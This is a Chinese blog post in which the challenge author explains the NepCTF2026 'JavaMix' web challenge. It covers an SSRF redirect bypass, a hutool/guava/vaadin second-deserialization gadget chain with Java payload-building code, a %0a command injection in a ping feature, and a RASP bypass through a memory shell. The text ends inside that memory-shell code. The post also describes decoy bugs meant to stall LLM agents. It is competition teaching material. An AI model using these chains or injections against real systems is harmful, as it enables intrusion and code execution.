@@ -1,0 +1,931 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    <meta name="keywords" content="Web, Security, Web安全, Java, Java安全">
+    <meta name="description" content="记录一下我的网安学习">
+    <meta name="author" content="1diot9">
+    
+    <title>
+        
+            NepCTF2026-JavaMix |
+        
+        1diot9&#39;s Blog
+    </title>
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    
+        <link rel="shortcut icon" href="/images/baka.png">
+    
+    
+<link rel="stylesheet" href="/font/css/fontawesome.min.css">
+
+    
+<link rel="stylesheet" href="/font/css/regular.min.css">
+
+    
+<link rel="stylesheet" href="/font/css/solid.min.css">
+
+    
+<link rel="stylesheet" href="/font/css/brands.min.css">
+
+    
+    <script class="keep-theme-configurations">
+    const KEEP = window.KEEP || {}
+    KEEP.hexo_config = {"hostname":"example.com","root":"/","language":"zh-CN","path":"search.json"}
+    KEEP.theme_config = {"base_info":{"primary_color":"#CCCCCC","title":"1diot9's Blog","author":"1diot9","avatar":"/images/baka.png","logo":"/images/baka.png","favicon":"/images/baka.png"},"menu":{"home":"/","archives":"/archives","tags":"/tags","categories":"/categories","about":"/about"},"first_screen":{"enable":true,"background_img":"/images/bg.svg","background_img_dark":"/images/bg.svg","description":"登上山顶的人沉默不语，半途而废者诉说着旅途的艰辛","hitokoto":false},"social_contact":{"enable":true,"links":{"github":"https://www.github.com/1diot9","weixin":"img | /images/weixin.jpg","qq":null,"weibo":null,"zhihu":null,"twitter":null,"x":null,"facebook":null,"email":null}},"scroll":{"progress_bar":true,"percent":false,"hide_header":true},"home":{"announcement":null,"category":true,"tag":true,"post_datetime":"updated","post_datetime_format":"YYYY-MM-DD HH:mm:ss"},"post":{"author_badge":{"enable":true,"level_badge":true,"custom_badge":["One","Two","Three"]},"word_count":{"wordcount":true,"min2read":true},"datetime_format":"YYYY-MM-DD HH:mm:ss","copyright_info":true,"share":false,"reward":{"enable":false,"img_link":null,"text":null,"icon":null},"img_align":"center"},"code_block":{"tools":{"enable":true,"style":"default"},"highlight_theme":"default"},"toc":{"enable":true,"number":true,"expand_all":true,"init_open":true,"layout":"right"},"website_count":{"busuanzi_count":{"enable":true,"site_uv":true,"site_pv":true,"page_pv":true}},"local_search":{"enable":true,"preload":true},"comment":{"enable":false,"use":"valine","valine":{"appid":null,"appkey":null,"server_urls":null,"placeholder":null},"gitalk":{"github_id":null,"github_admins":null,"repository":null,"client_id":null,"client_secret":null,"proxy":null},"twikoo":{"env_id":null,"region":null,"version":"1.6.39"},"waline":{"server_url":null,"reaction":false,"version":"3.3.2"},"giscus":{"repo":null,"repo_id":null,"category":"Announcements","category_id":null,"reactions_enabled":false},"artalk":{"server":null},"disqus":{"shortname":null}},"rss":{"enable":false},"lazyload":{"enable":false},"cdn":{"enable":false,"provider":"cdnjs"},"pjax":{"enable":true},"footer":{"since":2025,"word_count":true,"site_deploy":{"enable":true,"provider":"github","url":null},"record":{"enable":false,"list":[{"code":null,"link":null}]}},"inject":{"enable":false,"css":[null],"js":[null]},"root":"","source_data":{},"version":"4.2.5"}
+    KEEP.language_ago = {"second":"%s 秒前","minute":"%s 分钟前","hour":"%s 小时前","day":"%s 天前","week":"%s 周前","month":"%s 个月前","year":"%s 年前"}
+    KEEP.language_code_block = {"copy":"复制代码","copied":"已复制","fold":"折叠代码块","folded":"已折叠"}
+    KEEP.language_copy_copyright = {"copy":"复制版权信息","copied":"已复制","title":"原文标题","author":"原文作者","link":"原文链接"}
+  </script>
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+<body>
+<div class="progress-bar-container">
+    
+        <span class="scroll-progress-bar"></span>
+    
+
+    
+        <span class="pjax-progress-bar"></span>
+        <i class="pjax-progress-icon fas fa-circle-notch fa-spin"></i>
+    
+</div>
+
+
+
+<main class="page-container border-box">
+    <!-- home first screen  -->
+    
+
+    <!-- page content -->
+    <div class="page-main-content border-box">
+        <div class="page-main-content-top">
+            
+<header class="header-wrapper">
+
+    <div class="border-box header-content">
+        <div class="left flex-start border-box">
+            
+                <a class="logo-image border-box" href="/">
+                    <img src="/images/baka.png">
+                </a>
+            
+            <a class="site-name border-box" href="/">
+               1diot9&#39;s Blog
+            </a>
+        </div>
+
+        <div class="right border-box">
+            <div class="pc border-box">
+                <ul class="menu-list border-box">
+                    
+                        
+                        <li class="menu-item flex-start border-box">
+                            <a class="menu-text-color border-box" href="/">
+                                
+                                首页
+                                
+                            </a>
+                            
+                        </li>
+                    
+                        
+                        <li class="menu-item flex-start border-box">
+                            <a class="menu-text-color border-box" href="/archives">
+                                
+                                归档
+                                
+                            </a>
+                            
+                        </li>
+                    
+                        
+                        <li class="menu-item flex-start border-box">
+                            <a class="menu-text-color border-box" href="/tags">
+                                
+                                标签
+                                
+                            </a>
+                            
+                        </li>
+                    
+                        
+                        <li class="menu-item flex-start border-box">
+                            <a class="menu-text-color border-box" href="/categories">
+                                
+                                分类
+                                
+                            </a>
+                            
+                        </li>
+                    
+                        
+                        <li class="menu-item flex-start border-box">
+                            <a class="menu-text-color border-box" href="/about">
+                                
+                                关于
+                                
+                            </a>
+                            
+                        </li>
+                    
+                    
+                        <li class="menu-item search search-popup-trigger">
+                            <i class="menu-text-color fas search fa-search"></i>
+                        </li>
+                    
+                </ul>
+            </div>
+            <div class="mobile border-box flex-start">
+                
+                    <div class="icon-item search search-popup-trigger"><i class="fas fa-search"></i></div>
+                
+                <div class="icon-item menu-bar">
+                    <div class="menu-bar-middle"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div class="header-drawer">
+        <ul class="drawer-menu-list border-box">
+            
+                
+                <li class="drawer-menu-item border-box not-sub-menu">
+                    <label class="drawer-menu-label border-box">
+                        <a class="drawer-menu-text-color left-side flex-start border-box" href="/">
+                            
+                            首页
+                        </a>
+                        
+                    </label>
+                    
+                </li>
+            
+                
+                <li class="drawer-menu-item border-box not-sub-menu">
+                    <label class="drawer-menu-label border-box">
+                        <a class="drawer-menu-text-color left-side flex-start border-box" href="/archives">
+                            
+                            归档
+                        </a>
+                        
+                    </label>
+                    
+                </li>
+            
+                
+                <li class="drawer-menu-item border-box not-sub-menu">
+                    <label class="drawer-menu-label border-box">
+                        <a class="drawer-menu-text-color left-side flex-start border-box" href="/tags">
+                            
+                            标签
+                        </a>
+                        
+                    </label>
+                    
+                </li>
+            
+                
+                <li class="drawer-menu-item border-box not-sub-menu">
+                    <label class="drawer-menu-label border-box">
+                        <a class="drawer-menu-text-color left-side flex-start border-box" href="/categories">
+                            
+                            分类
+                        </a>
+                        
+                    </label>
+                    
+                </li>
+            
+                
+                <li class="drawer-menu-item border-box not-sub-menu">
+                    <label class="drawer-menu-label border-box">
+                        <a class="drawer-menu-text-color left-side flex-start border-box" href="/about">
+                            
+                            关于
+                        </a>
+                        
+                    </label>
+                    
+                </li>
+            
+        </ul>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+
+
+        </div>
+
+        <div class="page-main-content-middle border-box">
+
+            <div class="main-content border-box">
+                
+
+                    
+<div class="fade-in-down-animation">
+    <div class="post-page-container border-box">
+        <div class="post-content-container border-box">
+            
+
+            <div class="post-content-bottom border-box">
+                
+                    <div class="post-title">
+                        NepCTF2026-JavaMix
+                    </div>
+                
+
+                
+                    <div class="post-header border-box">
+                        
+                            <div class="avatar-box border-box">
+                                <img src="/images/baka.png">
+                            </div>
+                        
+                        <div class="info-box">
+                            <div class="author border-box">
+                                <span class="name">1diot9</span>
+                                
+                                    <span class="author-badge">Lv5</span>
+                                
+                            </div>
+                            <div class="meta-info border-box">
+                                
+
+<div class="post-meta-info-container border-box post">
+    <div class="post-meta-info border-box">
+        
+
+        
+            <span class="meta-info-item post-create-date">
+                <i class="icon fa-solid fa-calendar-plus"></i>&nbsp;
+                <span class="datetime">2026-07-30 22:37:23</span>
+            </span>
+
+            
+                <span class="meta-info-item post-update-date">
+                    <i class="icon fa-solid fa-file-pen"></i>&nbsp;
+                    <span class="datetime" data-updated="Thu Jul 30 2026 22:39:05 GMT+0800">2026-07-30 22:39:05</span>
+                </span>
+            
+        
+
+        
+
+        
+            <span class="post-tag meta-info-item border-box">
+                <ul class="post-tag-ul">
+                    
+                            <li class="tag-item"><span class="tag-separator"><i class="icon fas fa-hashtag"></i></span><a href="/tags/CTF-Java/">CTF-Java</a></li>
+                        
+                    
+                </ul>
+            </span>
+        
+
+        
+        
+            <span class="meta-info-item post-wordcount">
+                <i class="icon fas fa-file-word"></i>&nbsp;<span>5.1k 字</span>
+            </span>
+        
+        
+            <span class="meta-info-item post-min2read">
+                <i class="icon fas fa-clock"></i>&nbsp;<span>24 分钟</span>
+            </span>
+        
+        
+            <span class="meta-info-item post-pv">
+                <i class="icon fas fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
+            </span>
+        
+    </div>
+
+    
+</div>
+
+                            </div>
+                        </div>
+                    </div>
+                
+
+                <div class="post-content keep-markdown-body ">
+                    
+
+                    
+                         <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>这道题的主要考点有三个：</p>
+<p>1、SSRF重定向获取WebService服务的接口和接口参数</p>
+<p>2、hutools二次反序列化</p>
+<p>3、Rasp新线程绕过</p>
+<p>每一个考点单独拿出来都比较常规，但组合到一起，想要拿到flag就得仔细一点。</p>
+<p>同时，我在题目里还设置了很多虚假漏洞点，用于分散LLM注意力。因为在测试时发现，当LLM在反序列化这一关没思路时，如果设置了其他看起来能够利用的虚假漏洞点，其注意力很可能会被分散一部分，从而形成“反序列化有点难，做不出”–&gt;“看看其他漏洞点”–&gt;“其他漏洞点也利用不了”–&gt;“接着看反序列化，还是有点难，做不出”–&gt;“再去看看其他漏洞点”的死循环。随着上下文的自动压缩，如果没有人为干预，对于一些上下文较小的模型，就很难做出这道题。当时使用gpt5.5 x20的套餐，在只提供服务器和题目附件的情况下，跑完了周额度的70%，还是没有解出题目。</p>
+<p>设置虚假漏洞点，也是希望选手能够自己看一眼题目去确定方向，而不是完全交给Agent工具一把梭。最终的效果也还行，去掉ban后，只有7位选手拿到了flag，在整场比赛里算是比较难的一道题了。</p>
+<p>然而，在看过选手的wp后，还是感叹现在的LLM太强大，在我自行多轮测试后，还是被找到了非预期，是一种从来没见到过的反序列化构造手法。</p>
+<h1 id="SSRF重定向"><a href="#SSRF重定向" class="headerlink" title="SSRF重定向"></a>SSRF重定向</h1><p>打开题目后，有6个明显的功能点，其中右下角的内部服务没法直接访问，且很明显是让我们通过SSRF去进行本地访问。</p>
+<p>同时，通过题目源码，我们也能够知道，&#x2F;services 接口下的路由会经过isInternalAddress判断，只允许内网访问：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1784969446017-e957f107-7dae-440a-9dcb-96f0cabf6e22.png"  alt="img"></p>
+<p>不过可以发现，这里的访问控制是有问题的。第一个if通过equals比较，说明&#x2F;services无法通过GET和POST从外网访问。第二个if说明无法从外网发起任何GET请求。但&#x2F;services&#x2F;xxx 是可以直接从外网发起POST请求的。</p>
+<p>这里的设计是为了让选手通过SSRF GET拿到内网接口文档后，直接从外网通过POST进行攻击利用，这样即考察了SSRF，也不会太繁琐。</p>
+<p>可以看到，我特意在附件中隐藏了InternalDataServiceImpl的serviceName和方法内容，防止直接通过服务类推断出第二关的反序列化利用点：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1784969723438-071647bb-628f-4b86-8d7e-308364f4e802.png"  alt="img"></p>
+<p>而提供SSRF利用点的，很明显就是咨询抓取功能的 &#x2F;fetch 接口：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1784969888736-be65be56-d7f8-4ead-8947-e7928d9970e9.png"  alt="img"></p>
+<p>这个接口类通过黑名单的方式，禁止了传统的IP编码绕过：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1784969959134-55e6a0a6-e5a9-4f6b-a081-d2174d2b8e6e.png"  alt="img"></p>
+<p>但对于重定向是没有防护的，所以可以直接在服务器上通过一次重定向进行绕过：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1784970293616-a20dbd97-a32a-481b-8acc-fa60285f4d7a.png"  alt="img"></p>
+<h1 id="hutools二次反序列化"><a href="#hutools二次反序列化" class="headerlink" title="hutools二次反序列化"></a>hutools二次反序列化</h1><p>获取到DataSyncService服务的参数后，就可以确定反序列化入口，没脱敏的源码如下：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1784970669591-fbe9d47e-3afd-4bab-a66a-94f8d3bf6190.png"  alt="img"></p>
+<p>通过SafeObjectInputStream+自定义的黑名单，在resolveClass处进行过滤。这里就是非预期点，因为我没拦截resolveProxyClass.</p>
+<p>简单看一下黑名单，常见的二次反序列化类和Sink类，比如SignedObject等都被封了，所以大概率是找一个新的二次反序列化点。</p>
+<p>这里有三个依赖值得注意，guava、vaddin和hutool。</p>
+<p>vaddin链比较熟悉，是通过toString–&gt;getter实现任意public getter调用。</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1784979757480-ced9e22a-9e66-46ec-9c74-4145c821b974.png"  alt="img"></p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1784979677441-9f753762-b8c8-437f-96ad-7005561a3bcd.png"  alt="img"></p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1784979705715-eaf98162-cf3b-4d04-8990-18daf36a2db7.png"  alt="img"></p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1784979738322-d8671787-6606-47da-8307-5cec01a3cf4d.png"  alt="img"></p>
+<p>而hutool，如果有复现过前两年AliyunCTF题目，应该会比较熟悉。2024的chain17，hutools作为触发JDBC的链出现：</p>
+<p><a class="link"   target="_blank" rel="noopener" href="http://www.bmth666.cn/2024/03/31/%E7%AC%AC%E4%BA%8C%E5%B1%8A-AliyunCTF-chain17%E5%A4%8D%E7%8E%B0/index.html" >http://www.bmth666.cn/2024/03/31/%E7%AC%AC%E4%BA%8C%E5%B1%8A-AliyunCTF-chain17%E5%A4%8D%E7%8E%B0/index.html<i class="fas fa-external-link-alt"></i></a></p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1784971670478-4dcfa28b-0052-446c-837f-45d97f04f758.png"  alt="img"></p>
+<p>2025的Jtools，作为二次反序列化出现：</p>
+<p><a class="link"   target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/dMl0aEg6p7w7MKlUe7pCdg?poc_token=HBaCZGqjO1RLDUdvBIPN-Fe5YcftRLp26G5kuyml" >https://mp.weixin.qq.com/s/dMl0aEg6p7w7MKlUe7pCdg?poc_token=HBaCZGqjO1RLDUdvBIPN-Fe5YcftRLp26G5kuyml<i class="fas fa-external-link-alt"></i></a></p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">-&gt; org.apache.fury.Fury#deserialize</span><br><span class="line">-&gt; java.util.PriorityQueue#siftUpUsingComparator</span><br><span class="line">-&gt; com.feilong.core.util.comparator.PropertyComparator#compare</span><br><span class="line">-&gt; cn.hutool.core.map.MapProxy#invoke [Proxy.newProxyInstance]</span><br><span class="line">-&gt; cn.hutool.core.convert.Convert#convert</span><br><span class="line">-&gt; cn.hutool.core.convert.Convert#convertWithCheck</span><br><span class="line">-&gt; cn.hutool.core.convert.ConverterRegistry#convert</span><br><span class="line">-&gt; cn.hutool.core.convert.ConverterRegistry#convertSpecial</span><br><span class="line">-&gt; cn.hutool.core.convert.AbstractConverter#convert</span><br><span class="line">-&gt; cn.hutool.core.convert.impl.BeanConverter#convertInternal</span><br><span class="line">-&gt; cn.hutool.core.util.ObjectUtil#deserialize</span><br><span class="line">-&gt; cn.hutool.core.util.SerializeUtil#deserialize</span><br><span class="line">-&gt; cn.hutool.core.io.IoUtil#readObj</span><br><span class="line">-&gt; cn.hutool.core.io.ValidateObjectInputStream#readObject  [黑白名单为null]</span><br></pre></td></tr></table></figure>
+
+<p>通过MapProxy动态代理实现。</p>
+<p>经常用JavaChains的师傅应该也见过：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1784973569988-4bbc6f6b-b876-4fe8-803e-40cd9ce911bf.png"  alt="img"></p>
+<p>这里MapProxy二次反序列化通过getBounds触发，正好对应了vaddin链能够触发任意getter方法。</p>
+<p>最后的问题是，怎么触发toString，来触发vaddin链，这里就要用到guava依赖：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">readObject-&gt;toString</span><br><span class="line"></span><br><span class="line">* 链路：  </span><br><span class="line">*   HashMap.readObject()  </span><br><span class="line">*     → hash(key) → key.hashCode()  </span><br><span class="line">*     → Equivalence$Wrapper.hashCode()  </span><br><span class="line">*       → equivalence.hash(reference)  </span><br><span class="line">*     → FunctionalEquivalence.doHash(reference)  </span><br><span class="line">*       → function.apply(reference)   // ToStringFunction  </span><br><span class="line">*       → reference.toString()        // PropertysetItem  </span><br><span class="line">*     → PropertysetItem.toString()  </span><br><span class="line">*       → NestedMethodProperty.getValue()  </span><br><span class="line">*         → Method.invoke(instance, getter)</span><br></pre></td></tr></table></figure>
+
+<p>guava依赖里还有其他能够触发toString的链子，比如：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">readObject-&gt;compare-&gt;toString</span><br><span class="line"></span><br><span class="line">com.google.common.collect.ImmutableSetMultimap#readObject</span><br><span class="line">com.google.common.collect.ImmutableSortedSet.Builder#add(E)</span><br><span class="line">com.google.common.collect.ImmutableSortedSet.Builder#sortAndDedup</span><br><span class="line">java.util.Arrays#sort(T[], int, int, java.util.Comparator&lt;? super T&gt;)</span><br><span class="line">java.util.TimSort#sort</span><br><span class="line">java.util.TimSort#countRunAndMakeAscending</span><br><span class="line">com.google.common.collect.UsingToStringOrdering#compare</span><br><span class="line">xxx.toString</span><br></pre></td></tr></table></figure>
+
+<p>如果研究过帆软channel反序列化，可能会对这条链子很熟悉，我之前的文章里也有提到过：</p>
+<p><a class="link"   target="_blank" rel="noopener" href="https://xz.aliyun.com/news/91802#immutablesetmultimap%E9%93%BE" >https://xz.aliyun.com/news/91802#immutablesetmultimap%E9%93%BE<i class="fas fa-external-link-alt"></i></a></p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1784974087376-53e361a4-e3c8-45ad-97fe-1b97172e644b.png"  alt="img"></p>
+<p>后续做LLM自动反序列化链挖掘尝试时，拿guava开刀，又挖到不少能够触发toString的，所以这里用了其中一条来出题。</p>
+<p>最后的二次反序列化链代码：</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">    @SuppressWarnings(&quot;unchecked&quot;)</span><br><span class="line">    private static Object wrapWithGuavaHashMap(Object toStringTarget) throws Exception &#123;</span><br><span class="line">        Equivalence&lt;Object&gt; eq = (Equivalence&lt;Object&gt;) (Equivalence&lt;?&gt;)</span><br><span class="line">                Equivalence.equals().onResultOf(Functions.toStringFunction());</span><br><span class="line"></span><br><span class="line">        Equivalence.Wrapper&lt;Object&gt; wrapper = eq.wrap(&quot;dummy&quot;);</span><br><span class="line"></span><br><span class="line">        HashMap&lt;Object, Object&gt; map = new HashMap&lt;&gt;();</span><br><span class="line">        map.put(wrapper, &quot;v&quot;);</span><br><span class="line"></span><br><span class="line">        Field refField = Equivalence.Wrapper.class.getDeclaredField(&quot;reference&quot;);</span><br><span class="line">        refField.setAccessible(true);</span><br><span class="line">        refField.set(wrapper, toStringTarget);</span><br><span class="line"></span><br><span class="line">        return map;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">      private static Object createPropertysetItem(Object instance, String property) throws Exception &#123;</span><br><span class="line">        NestedMethodProperty&lt;?&gt; prop = new NestedMethodProperty&lt;&gt;(instance, property);</span><br><span class="line">        PropertysetItem item = new PropertysetItem();</span><br><span class="line">        item.addItemProperty(&quot;x&quot;, prop);</span><br><span class="line">        return item;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">// innerPayload就是内层反序列化字节码，随便找条Templates的链子就行</span><br><span class="line">        private static byte[] buildOuterChain(byte[] innerPayload) throws Exception &#123;</span><br><span class="line">        HashMap&lt;String, Object&gt; proxyMap = new HashMap&lt;&gt;();</span><br><span class="line">        proxyMap.put(&quot;margin&quot;, innerPayload);</span><br><span class="line">        MapProxy mapProxy = MapProxy.create(proxyMap);</span><br><span class="line"></span><br><span class="line">        Object proxy = Proxy.newProxyInstance(</span><br><span class="line">                Exploit.class.getClassLoader(),</span><br><span class="line">                new Class[]&#123;Layout.MarginHandler.class, Serializable.class&#125;,</span><br><span class="line">                mapProxy</span><br><span class="line">        );</span><br><span class="line"></span><br><span class="line">        Object propertysetItem = createPropertysetItem(proxy, &quot;margin&quot;);</span><br><span class="line">        Object hashMap = wrapWithGuavaHashMap(propertysetItem);</span><br><span class="line"></span><br><span class="line">        ByteArrayOutputStream bos = new ByteArrayOutputStream();</span><br><span class="line">        ObjectOutputStream oos = new ObjectOutputStream(bos);</span><br><span class="line">        oos.writeObject(hashMap);</span><br><span class="line">        oos.close();</span><br><span class="line">        return bos.toByteArray();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<h1 id="Rasp绕过"><a href="#Rasp绕过" class="headerlink" title="Rasp绕过"></a>Rasp绕过</h1><p>能够反序列化后，一般都会注入内存马或使用回显技术，直接读取flag，但直接命令执行是会跳转到OpenRASP的拦截页面的。但是这题其实从一开始就有提示，题目描述里有“某种能防御0day的设备“，很显然就是Rasp了。而且在系统诊断的ping功能处，我故意设置了一个漏洞，黑名单遗漏换行符 + find() 只校验首段，%0a 可注入命令，但注入后会被Rasp拦截：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1784974750275-bf7a771d-4e18-4b71-be50-8719542f3ccf.png"  alt="img"></p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1784974690410-7d0596db-adc9-4c3c-aca3-6b316a93c46f.png"  alt="img"></p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1784975058940-81ea45ad-8391-49d0-8a48-ea9afaf2082b.png"  alt="img"></p>
+<p>但Rasp只拦截了命令执行的相关方法，文件操作的是不拦截的，所以可以注入能够进行文件操作的内存马，读取rasp文件，然后本地分析，内存马如下：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span 